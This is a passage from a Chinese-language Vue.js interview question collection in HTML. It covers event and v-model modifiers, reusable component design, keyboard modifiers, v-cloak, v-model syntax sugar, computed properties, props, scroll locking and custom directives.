<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1. 少量静态文件的域名，图片与iconfont均是放在同一个域下，减少DNS的解析事件，最好做到域名收敛。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2. 模块化接口的支持。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">3. 首屏内容最好做到静态缓存</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">4. 对于vue和react做ssr</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">59.vue常用的修饰符</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.stop - 调用 event.stopPropagation()，禁止事件冒泡。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.prevent - 调用 event.preventDefault()，阻止事件默认行为。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.capture - 添加事件侦听器时使用 capture 模式。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.self - 只当事件是从侦听器绑定的元素本身触发时才触发回调。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.native - 监听组件根元素的原生事件。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.once - 只触发一次回调。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-model 指令常用修饰符：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.number - 输入字符串转为数字</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.trim - 输入首尾空格过滤</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.lazy</span></span></p> 
<h2 id="60.v-on%E5%8F%AF%E4%BB%A5%E7%9B%91%E5%90%AC%E5%A4%9A%E4%B8%AA%E6%96%B9%E6%B3%95%E5%90%97%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">60.v-on可以监听多个方法吗？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-on可以监听多个方法，但是同一种事件类型的方法，vue-cli工程会报错</span></span></p> 
<h2 id="61.vue%E4%B8%AD%E7%BC%96%E5%86%99%E5%8F%AF%E5%A4%8D%E7%94%A8%E7%9A%84%E7%BB%84%E4%BB%B6(%E6%B7%B1%E5%BA%A6%E5%A5%BD%E9%A2%98%EF%BC%8C%E6%8E%8C%E6%8F%A1%E6%80%9D%E8%B7%AF%2C%E4%B8%8D%E7%94%A8%E8%83%8C%E8%AF%B5)" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">61.vue中编写可复用的组件(深度好题，掌握思路,不用背诵)</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">1.在 Vue 组件中，状态称为 props，事件称为 events，片段称为 slots。</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Props 允许外部环境传递数据给组件</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Events 允许组件触发外部环境的副作用 $emit</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Slots 允许外部环境将额外的内容组合在组件中。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件的构成部分也可以理解为组件对外的接口。良好的可复用组件应当定义一个清晰的公开接口。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">2.组件间通信</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">在 Vue.js 中，父子组件的关系可以总结为 props down, events up 。父组件通过 props 向下传递数据给子组件，子组件通过 events 给父组件发送消息。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">3.命名</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件的命名应该跟业务无关。应该依据组件的功能为组件命名。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">4.业务数据无关</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">可复用组件只负责 UI 上的展示和一些交互以及动画，如何获取数据跟它无关，因此不要在组件内部去获取数据，以及任何与服务端打交道的操作。可复用组件只实现 UI 相关的功能。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">5.组件职责</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">约束好组件的职责，能让组件更好地解耦，知道什么功能是组件实现的，什么功能不需要实现。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件可以分为通用组件（可复用组件）和业务组件（一次性组件）。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">可复用组件实现通用的功能（不会因组件使用的位置、场景而变化）：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">UI 的展示</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">与用户的交互（事件）</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">动画效果</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">业务组件实现偏业务化的功能：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">获取数据</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">和 vuex 相关的操作</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">埋点</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">引用可复用组件</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">可复用组件应尽量减少对外部条件的依赖，所有与 vuex 相关的操作都不应在可复用组件中出现。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件应当避免对其父组件的依赖，不要通过 this.$parent 来操作父组件的示例。父组件也不要通过 this.$children 来引用子组件的示例，而是通过子组件的接口与之交互。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">6.命名空间</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">可复用组件除了定义一个清晰的公开接口外，还需要有命名空间。 modules</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">命名空间可以避免与浏览器保留标签和其他组件的冲突。特别是当项目引用外部 UI 组件或组件迁移到其他项目时，命名空间可以避免很多命名冲突的问题。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">7.上下文无关</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">还是上面那句话，可复用组件应尽量减少对外部条件的依赖。没有特别需求且单个组件不至于过重的的前提下，不要把一个有独立功能的组件拆分成若干个小组件。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">8.数据扁平化</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">每个 prop 应该是一个简单类型的数据。这样做有下列几点好处：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件接口清晰</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">props 校验方便</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">当服务端返回的对象中的 key 名称与组件接口不一样时，不需要重新构造一个对象</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">9.使用自定义事件实现数据的双向绑定 v-model</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">有时候，对于一个状态，需要同时从组件内部和组件外部去改变它。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">:value   oninput</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">例如，模态框的显示和隐藏，父组件可以初始化模态框的显示，模态框组件内部的关闭按钮可以让其隐藏。一个好的办法是，使用自定义事件改变父组件中的值  </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">10.使用自定义 watch 优化 DOM 操作</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">在开发中，有些逻辑无法使用数据绑定，无法避免需要对 DOM 的操作。例如，视频的播放需要同步 Video 对象的播放操作及组件内的播放状态。可以使用自定义 watch 来优化 DOM 的操作。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">11.项目骨架</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">单组件不异过重，组件在功能独立的前提下应该尽量简单，越简单的组件可复用性越强。当你实现组件的代码，不包括CSS，有好几百行了（这个大小视业务而定），那么就要考虑拆分成更小的组件。</span></span></p> 
<h2 id="62.vue%E5%A6%82%E4%BD%95%E7%9B%91%E5%90%AC%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6%E4%B8%AD%E7%9A%84%E6%8C%89%E9%94%AE%EF%BC%9F%EF%BC%88%E5%A4%A7%E5%A3%B0%E6%9C%97%E8%AF%BB2%E9%81%8D%EF%BC%89" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">62.vue如何监听键盘事件中的按键？（大声朗读2遍）</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">在我们的项目经常需要监听一些键盘事件来触发程序的执行，而Vue中允许在监听的时候添加关键修饰符：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;input v-on:keyup.13="submit"&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">对于一些常用键，还提供了按键别名：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;input v-on:keyup.13="submit"&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">全部的按键别名：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.enter</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.tab</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.delete (捕获“删除”和“退格”键)</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.esc</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.space</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.up</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.down</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.left</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.right</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">修饰键：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.ctrl</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.alt</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.shift</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">.meta</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">与按键别名不同的是，修饰键和 keyup 事件一起用时，事件引发时必须按下正常的按键。换一种说法：如果要引发 keyup.ctrl，必须按下 ctrl 时释放其他的按键；单单释放 ctrl 不会引发事件</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;!-- 按下Alt + 释放C触发 --&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;input @keyup.alt.67="clear"&gt; </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;!-- 按下Alt + 释放任意键触发 --&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;input @keyup.alt="other"&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;!-- 按下Ctrl + enter时触发 --&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;input @keydown.ctrl.13="submit"&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">对于elementUI的input，我们需要在后面加上.native, 因为elementUI对input进行了封装，原生的事件不起作用。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;input v-model="form.name" placeholder="昵称" @keyup.enter="submit"&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;el-input v-model="form.name" placeholder="昵称" @keyup.enter.native="submit"&gt;&lt;/el-input&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">63.解决非工程化项目初始化页面闪动问题(好题,理解)</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vue页面在加载的时候闪烁花括号{}，v-cloak指令和css规则如[v-cloak]{display:none}一起用时，这个指令可以隐藏未编译的Mustache标签直到实例准备完毕。{<!-- -->{name}}    data:  name:''</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">/*css样式*/</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">[v-cloak] {<!-- --></span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">      display: none;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    }</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;!--html代码--&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;div id="app" v-cloak&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    &lt;ul&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">      &lt;li v-for="item in tabs"&gt;{<!-- -->{item.text}}&lt;/li&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    &lt;/ul&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">  &lt;/div&gt;</span></span></p> 
<h2 id="64.v-for%E4%BA%A7%E7%94%9F%E7%9A%84%E5%88%97%E8%A1%A8%EF%BC%8C%E5%AE%9E%E7%8E%B0active%E7%9A%84%E5%88%87%E6%8D%A2%20tab%E5%88%87%E6%8D%A2" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">64.v-for产生的列表，实现active的切换 tab切换</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-for生成序列</span></span></p> 
<pre><code>&lt;ul&gt;

    &lt;li v-for="(info,index) in list" :key="info.id" @click="select(index)" v-bind:class="{'active':info.active}"&gt;{<!-- -->{info.name}}&lt;/li&gt;

&lt;/ul&gt;</code></pre> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">data数据</span></span></p> 
<pre><code>list:[

        {

          name:'a',

          id:1,

          active:false

        },

        {

          name:'b',

          id:2,

          active:false

        },

        {

          name:'c',

          id:3,

          active:false

        },

        {

          name:'d',

          id:4,

          active:false

        },

      ]</code></pre> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">点击事件</span></span></p> 
<pre><code>select(d){

      this.list.map(s=&gt;s.active=false); //for  forEach  map  filter some

      this.list[d].active=true;

    },</code></pre> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">CSS样式</span></span></p> 
<pre><code>&lt;style scoped&gt;

li.active{

  background-color: red;

 }</code></pre> 
<h2 id="65.v-model%E8%AF%AD%E6%B3%95%E7%B3%96%E4%BD%BF%E7%94%A8" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">65.v-model语法糖使用</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-model语法糖  v-model其实是一种简写方式，我们常见的有两种v-model，分别是input元素上的v-model 和非input元素上v-model</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">input元素上的：      </span></span></p> 
<pre><code>&lt;input v-model="price"&gt;&lt;!-- 下行的语法糖 --&gt;

      &lt;input :value="price" @input="price = $event.target.value"&gt;

     

      data(){

        return {

          price: 20

         }

      }

 非input元素上的：

 Vue.component('base-checkbox', {

  model: {

    prop: 'checked',

    event: 'change'

  },

  template: `

    &lt;input

      type="checkbox"

      v-bind:checked="checked"

      v-on:change="$emit('change', $event.target.checked)"

    &gt;

  `

})

父组件：&lt;base-checkbox v-model="lovingVue"&gt;&lt;/base-checkbox&gt;</code></pre> 
<h2 id="66.%E5%8D%81%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">66.十个常用的自定义过滤器</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（1）去除空格  </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">type:1-所有空格  2-前后空格  3-前空格 4-后空格。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（2）任意格式日期处理</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（3）字母大小写切换</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">type:1:首字母大写 2：首页母小写 3：大小写转换 4：全部大写 5：全部小写</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（4）字符串循环复制,count-&gt;次数.</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（5）字符串替换</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（6）字符替换*，隐藏手机号或者身份证号等</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（7）格式化处理字符串</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（8）现金额大写转换函数</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（9）保留2位小数   0.3 + 0.9 ！= 1.2  </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">（10）补零</span></span></p> 
<h2 id="67.vue%E7%AD%89%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8%E5%8F%8A%E5%85%B6%E4%BC%98%E7%BC%BA%E7%82%B9" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">67.vue等单页面应用及其优缺点</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">单页面应用（SPA），通俗一点说就是指只有一个主页面的应用</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">单页面的优点：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">   用户体验好，快，内容的改变不需要重新加载整个页面，基于这一点spa对服务器压力较小。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">   前后端分离。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">   效果会比较炫酷（比如切换页面内容时的专场动画）。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">单页面缺点：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">  不利于seo。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">  导航不可用，如果一定要导航需要自行实现前进、后退。（由于是单页面不能用浏览器的前进后退功能，所以需要自己建立堆栈管理）。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">  初次加载时耗时多。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">  页面复杂度提高很多。</span></span></p> 
<h2 id="68.vue%E7%9A%84%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%EF%BC%8C%E7%89%B9%E6%80%A7%EF%BC%8C%E5%BA%94%E7%94%A8" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">68.vue的计算属性，特性，应用</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">含义：computed  是计算属性，把模板中的一些稍微复杂的逻辑计算放回到js代码中，解决在模板中放入太多的逻辑会让模板过重且难以维护的问题。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">computed特性：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    （1）computed 是基于它们的依赖进行缓存的</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    （2）只有在它的相关依赖发生改变时才会重新求值</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">computed应用：就是简化tempalte里面{<!-- -->{}}计算和处理props或$emit的传值</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">69.vue父组件向子组件通过props传递数据</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">父组件传递：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    &lt;子组件调用  v-bind:自定义属性名="要传递的数据"&gt;&lt;/子组件调用&gt;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">子组件接收：</span></span></p> 
<pre><code>    props:['自定义属性名']

    props:{

     type:String,

     default{

       return ''

     }

    }</code></pre> 
<h2 id="70.vue-cli%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8%E5%85%A8%E5%B1%80%E5%B8%B8%E9%87%8F(%E4%BA%86%E8%A7%A3)" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">70.vue-cli生产环境使用全局常量(了解)</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第一步，在 static 下新建 config.js：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第二步，在 config.js 里面设置全局变量：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第三步，在 index.html 里面引入：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第四步，在其他 .js 文件中即可使用：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第五步，打包后修改：通过 `npm run build` 命令打包后，此 config.js 文件会被打包到 `dist/static`文件夹下，此时如果需要修改 `PUBLIC_IP`，打开`config.js`即可修改，无需重新打包！</span></span></p> 
<h2 id="71.vue%E5%BC%B9%E7%AA%97%E5%90%8E%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%BB%9A%E5%8A%A8%EF%BC%9F%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89" style="margin-left:.0001pt;text-align:left"><span style="color:#ffd900">71.vue弹窗后如何禁止滚动条滚动？（了解）</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1.在有弹出框的页面中，加上以下方法，弹出框出现时调用禁止滚动方法stopScroll()，弹出框去掉是调取允许滚动方法canScroll()即可，代码如下</span></span></p> 
<pre><code>methods : {

  //禁止滚动

  stopScroll(){

    var mo=function(e){e.preventDefault();};

    document.body.style.overflow='hidden';

    document.addEventListener("touchmove",mo,false);//禁止页面滑动

  },

  /***取消滑动限制***/

  canScroll(){

    var mo=function(e){e.preventDefault();};

    document.body.style.overflow='';//出现滚动条

    document.removeEventListener("touchmove",mo,false);

  }

}</code></pre> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2.在全局js即main.js中，设置全局函数，在使用到的页面分别调用即可，代码如下：</span></span></p> 
<pre><code>
//弹出框禁止滑动

Vue.prototype.stopScroll = function () {

 var mo = function (e) { e.preventDefault() }

 document.body.style.overflow = 'hidden'

 document.addEventListener('touchmove', mo, false)// 禁止页面滑动

}



//弹出框可以滑动

Vue.prototype.canScroll = function () {

 var mo = function (e) {

  e.preventDefault()

 }

 document.body.style.overflow = ''// 出现滚动条

 document.removeEventListener('touchmove', mo, false)

}</code></pre> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">具体页面的调用方法如下：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333"> //当需要禁止弹出框底部内容滑动时调用：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8"> this.stopScroll()</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333"> //当需要页面恢复滑动功能时调用：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fff5e6"> this.canScroll()</span></span></p> 
<h2 id="72.vue-cli%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">72.vue-cli中自定义指令的使用</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1.全局注册</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Vue.directive(‘name’, {})</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2.局部注册</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">directives: {<!-- --></span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">  name: {}</span></span></p> 
